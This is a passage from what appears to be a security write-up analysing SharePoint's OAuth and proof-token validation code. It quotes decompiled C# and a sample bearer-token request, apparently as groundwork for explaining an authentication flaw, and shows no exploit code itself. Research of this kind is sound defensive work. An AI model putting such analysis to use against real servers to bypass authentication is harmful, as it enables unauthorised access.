</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">spincomingTokenContext</span><span class="p">.</span><span class="n">TokenType</span> <span class="p">!=</span> <span class="n">SPIncomingTokenType</span><span class="p">.</span><span class="n">Loopback</span> <span class="p">&amp;&amp;</span> <span class="n">httpApplication</span> <span class="p">!=</span> <span class="k"><span class="hljs-literal">null</span></span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">SPSecurityTokenServiceManager</span><span class="p">.</span><span class="n">LocalOrThrow</span><span class="p">.</span><span class="n">AllowOAuthOverHttp</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">Uri</span><span class="p">.</span><span class="n">UriSchemeHttps</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">SPAlternateUrl</span><span class="p">.</span><span class="n">ContextUri</span><span class="p">.</span><span class="n">Scheme</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [4]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPApplicationAuthenticationModule</span><span class="p">.</span><span class="n">SendSSLRequiredResponse</span><span class="p">(</span><span class="n">httpApplication</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">JsonWebSecurityToken</span> <span class="n">jsonWebSecurityToken</span> <span class="p">=</span> <span class="n">spincomingTokenContext</span><span class="p">.</span><span class="n">SecurityToken</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">JsonWebSecurityToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">SignInProofToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">,</span> <span class="n">jsonWebSecurityToken</span><span class="p">,</span> <span class="n">spidentityProofToken</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [5]</span></span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><em><strong>Note:</strong> The code at <strong>[4]</strong> and <strong>[5]</strong> will be discussed at a much later stage.</em></p>
<p>At <strong>[3]</strong>, the <code>SPApplicationAuthenticationModule.TryExtractAndValidateToken()</code> method will try to parse the authentication token from HTTP request and perform validation checks:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">TryExtractAndValidateToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">HttpContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">httpContext</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">SPIncomingTokenContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">tokenContext</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">SPIdentityProofToken</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">identityProofToken</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">TryParseOAuthToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">text</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [6]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">VariantConfiguration</span><span class="p">.</span><span class="n">IsGlobalExpFeatureToggleEnabled</span><span class="p">(</span><span class="n">ExpFeatureId</span><span class="p">.</span><span class="n">AuthZenProofToken</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">TryParseProofToken</span><span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">out</span></span> <span class="n">text2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPIdentityProofToken</span> <span class="n">spidentityProofToken</span> <span class="p">=</span> <span class="n">SPIdentityProofTokenUtilities</span><span class="p">.</span><span class="n">CreateFromJsonWebToken</span><span class="p">(</span><span class="n">text2</span><span class="p">,</span> <span class="n">text</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [7]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">VariantConfiguration</span><span class="p">.</span><span class="n">IsGlobalExpFeatureToggleEnabled</span><span class="p">(</span><span class="n">ExpFeatureId</span><span class="p">.</span><span class="n">AuthZenProofToken</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Microsoft</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">SecurityTokenHandler</span> <span class="n">identityProofTokenHandler</span> <span class="p">=</span> <span class="n">SPClaimsUtility</span><span class="p">.</span><span class="n">GetIdentityProofTokenHandler</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">StringBuilder</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">using</span></span> <span class="p">(</span><span class="n">XmlWriter</span> <span class="n">xmlWriter</span> <span class="p">=</span> <span class="n">XmlWriter</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">stringBuilder</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">identityProofTokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">xmlWriter</span><span class="p">,</span> <span class="n">spidentityProofToken</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [8]</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPIdentityProofToken</span> <span class="n">spidentityProofToken2</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">using</span></span> <span class="p">(</span><span class="n">XmlReader</span> <span class="n">xmlReader</span> <span class="p">=</span> <span class="n">XmlReader</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="k"><span class="hljs-keyword">new</span></span> <span class="n">StringReader</span><span class="p">(</span><span class="n">stringBuilder</span><span class="p">.</span><span class="n">ToString</span><span class="p">())))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">spidentityProofToken2</span> <span class="p">=</span> <span class="n">identityProofTokenHandler</span><span class="p">.</span><span class="n">ReadToken</span><span class="p">(</span><span class="n">xmlReader</span><span class="p">)</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">SPIdentityProofToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ClaimsIdentityCollection</span> <span class="n">claimsIdentityCollection</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">claimsIdentityCollection</span> <span class="p">=</span> <span class="n">identityProofTokenHandler</span><span class="p">.</span><span class="n">ValidateToken</span><span class="p">(</span><span class="n">spidentityProofToken2</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [9]</span></span>
</span></span><span class="line"><span class="cl">    <span class="n">tokenContext</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SPIncomingTokenContext</span><span class="p">(</span><span class="n">spidentityProofToken2</span><span class="p">.</span><span class="n">IdentityToken</span><span class="p">,</span> <span class="n">claimsIdentityCollection</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">identityProofToken</span> <span class="p">=</span> <span class="n">spidentityProofToken2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">tokenContext</span><span class="p">.</span><span class="n">IsProofTokenScenario</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">true</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPClaimsUtility</span><span class="p">.</span><span class="n">VerifyProofTokenEndPointUrl</span><span class="p">(</span><span class="n">tokenContext</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [10]</span></span>
</span></span><span class="line"><span class="cl">    <span class="n">SPIncomingServerToServerProtocolIdentityHandler</span><span class="p">.</span><span class="n">SetRequestIncomingOAuthIdentityType</span><span class="p">(</span><span class="n">tokenContext</span><span class="p">,</span> <span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">SPIncomingServerToServerProtocolIdentityHandler</span><span class="p">.</span><span class="n">SetRequestIncomingOAuthTokenType</span><span class="p">(</span><span class="n">tokenContext</span><span class="p">,</span> <span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[6]</strong>, the <code>TryParseOAuthToken()</code> method will attempt to retrieve the OAuth access token from HTTP request from either the query string parameter <code>access_token</code> or the <code>Authorization</code> header, and store it into the <code>text</code> variable.</p>
<p>For example, the HTTP request will resemble the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http hljs" data-lang="http"><span class="line"><span class="cl"><span class="nf"><span class="hljs-keyword">GET</span></span> <span class="nn"><span class="hljs-string">/_api/web/</span></span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Connection</span></span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Authorization</span></span><span class="o">:</span> <span class="l">Bearer &lt;access_token&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">User-Agent</span></span><span class="o">:</span> <span class="l">python-requests/2.27.1</span>
</span></span><span class="line"><span class="cl"><span class="n"><span class="hljs-attribute">Host</span></span><span class="o">:</span> <span class="l">sharepoint</span>
</span></span></code></pre></div><p>Similarly, after extracting the OAuth access token from the HTTP request, the <code>TryParseProofToken()</code> method will attempt to retrieve the proof token from HTTP request from either the query string parameter <code>prooftoken</code> or the <code>X-PROOF_TOKEN</code> header, and store it into the <code>text2</code> variable.</p>
<p>At <strong>[7]</strong>, both tokens are then passed to the <code>SPIdentityProofTokenUtilities.CreateFromJsonWebToken()</code> method as arguments.</p>
<p>The relevant code of the <code>SPIdentityProofTokenUtilities.CreateFromJsonWebToken()</code> method is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">SPIdentityProofToken</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">CreateFromJsonWebToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">proofTokenString</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">identityTokenString</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">RequestApplicationSecurityTokenResponse</span><span class="p">.</span><span class="n">NonValidatingJsonWebSecurityTokenHandler</span> <span class="n">nonValidatingJsonWebSecurityTokenHandler</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">RequestApplicationSecurityTokenResponse</span><span class="p">.</span><span class="n">NonValidatingJsonWebSecurityTokenHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">SecurityToken</span> <span class="n">securityToken</span> <span class="p">=</span> <span class="n">nonValidatingJsonWebSecurityTokenHandler</span><span class="p">.</span><span class="n">ReadToken</span><span class="p">(</span><span class="n">proofTokenString</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [11]</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">securityToken</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULS</span><span class="p">.</span><span class="n">SendTraceTag</span><span class="p">(</span><span class="m"><span class="hljs-number">3536843</span></span><span class="n"><span class="hljs-number">U</span></span><span class="p">,</span> <span class="n">ULSCat</span><span class="p">.</span><span class="n">msoulscat_WSS_ApplicationAuthentication</span><span class="p">,</span> <span class="n">ULSTraceLevel</span><span class="p">.</span><span class="n">Unexpected</span><span class="p">,</span> <span class="s"><span class="hljs-string">"CreateFromJsonWebToken: Proof token is not a valid JWT string."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">InvalidOperationException</span><span class="p">(</span><span class="s"><span class="hljs-string">"Proof token is not JWT"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">SecurityToken</span> <span class="n">securityToken2</span> <span class="p">=</span> <span class="n">nonValidatingJsonWebSecurityTokenHandler</span><span class="p">.</span><span class="n">ReadToken</span><span class="p">(</span><span class="n">identityTokenString</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [12]</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">securityToken2</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULS</span><span class="p">.</span><span class="n">SendTraceTag</span><span class="p">(</span><span class="m"><span class="hljs-number">3536844</span></span><span class="n"><span class="hljs-number">U</span></span><span class="p">,</span> <span class="n">ULSCat</span><span class="p">.</span><span class="n">msoulscat_WSS_ApplicationAuthentication</span><span class="p">,</span> <span class="n">ULSTraceLevel</span><span class="p">.</span><span class="n">Unexpected</span><span class="p">,</span> <span class="s"><span class="hljs-string">"CreateFromJsonWebToken: Identity token is not a valid JWT string."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">InvalidOperationException</span><span class="p">(</span><span class="s"><span class="hljs-string">"Identity token is not JWT"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">JsonWebSecurityToken</span> <span class="n">jsonWebSecurityToken</span> <span class="p">=</span> <span class="n">securityToken2</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">JsonWebSecurityToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">jsonWebSecurityToken</span> <span class="p">==</span> <span class="k"><span class="hljs-literal">null</span></span> <span class="p">||</span> <span class="p">!</span><span class="n">jsonWebSecurityToken</span><span class="p">.</span><span class="n">IsAnonymousIdentity</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">spidentityProofToken</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SPIdentityProofToken</span><span class="p">(</span><span class="n">securityToken2</span><span class="p">,</span> <span class="n">securityToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">try</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SPAudienceValidatingIdentityProofTokenHandler</span><span class="p">().</span><span class="n">ValidateAudience</span><span class="p">(</span><span class="n">spidentityProofToken</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [13]</span></span>
</span></span><span class="line"><span class="cl">      <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">spidentityProofToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At a quick glance, it can be inferred that both the access token (passed as <code>identityTokenString</code> parameter) and the proof token (passed as <code>proofTokenString</code> parameter) are expected to be JSON Web Tokens (JWTs).</p>
<p>An instance of the <code>RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler</code> type is initialized to perform token parsing and validation before calling the <code>nonValidatingJsonWebSecurityTokenHandler.ReadToken()</code> method at <strong>[11]</strong>.</p>
<p>The <code>RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler</code> type is a sub-type of <code>JsonWebSecurityTokenHandler</code>. Since <code>RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler</code> does not override the <code>ReadToken()</code> method, calling <code>nonValidatingJsonWebSecurityTokenHandler.ReadToken()</code> method is equivalent to calling <code>JsonWebSecurityTokenHandler.ReadToken()</code> (wrapper function for the <code>JsonWebSecurityTokenHandler.ReadTokenCore()</code> method).</p>
<p>The relevant code of <code>JsonWebSecurityTokenHandler</code> that validates the access and proof tokens at <strong>[11]</strong> and at <strong>[12]</strong> respectively is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">SecurityToken</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ReadToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">ReadTokenCore</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">CanReadToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Utility</span><span class="p">.</span><span class="n">VerifyNonNullOrEmptyStringArgument</span><span class="p">(</span><span class="s"><span class="hljs-string">"token"</span></span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">return</span></span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">IsJsonWebSecurityToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">bool</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">IsJsonWebSecurityToken</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">Regex</span><span class="p">.</span><span class="n">IsMatch</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="s"><span class="hljs-string">"^[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]*$"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">SecurityToken</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ReadTokenCore</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">token</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">isActorToken</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Utility</span><span class="p">.</span><span class="n">VerifyNonNullOrEmptyStringArgument</span><span class="p">(</span><span class="s"><span class="hljs-string">"token"</span></span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">CanReadToken</span><span class="p">(</span><span class="n">token</span><span class="p">))</span> <span class="c1"><span class="hljs-comment">// [14]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">SecurityTokenException</span><span class="p">(</span><span class="s"><span class="hljs-string">"Unsupported security token."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">token</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="k"><span class="hljs-keyword">new</span></span> <span class="kt"><span class="hljs-keyword">char</span></span><span class="p">[]</span> <span class="p">{</span> <span class="sc"><span class="hljs-string">'.'</span></span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">text</span> <span class="p">=</span> <span class="n">array</span><span class="p">[</span><span class="m"><span class="hljs-number">0</span></span><span class="p">];</span>  <span class="c1"><span class="hljs-comment">// JWT Header</span></span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">text2</span> <span class="p">=</span> <span class="n">array</span><span class="p">[</span><span class="m"><span class="hljs-number">1</span></span><span class="p">];</span> <span class="c1"><span class="hljs-comment">// JWT Payload (JWS Claims)</span></span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">text3</span> <span class="p">=</span> <span class="n">array</span><span class="p">[</span><span class="m"><span class="hljs-number">2</span></span><span class="p">];</span> <span class="c1"><span class="hljs-comment">// JWT Signature</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">,</span> <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">&gt;</span> <span class="n">dictionary</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">,</span> <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">&gt;(</span><span class="n">StringComparer</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dictionary</span><span class="p">.</span><span class="n">DecodeFromJson</span><span class="p">(</span><span class="n">Base64UrlEncoder</span><span class="p">.</span><span class="n">Decode</span><span class="p">(</span><span class="n">text</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">,</span> <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">&gt;</span> <span class="n">dictionary2</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">,</span> <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">&gt;(</span><span class="n">StringComparer</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dictionary2</span><span class="p">.</span><span class="n">DecodeFromJson</span><span class="p">(</span><span class="n">Base64UrlEncoder</span><span class="p">.</span><span class="n">Decode</span><span class="p">(</span><span class="n">text2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">text4</span><span class="p">;</span>
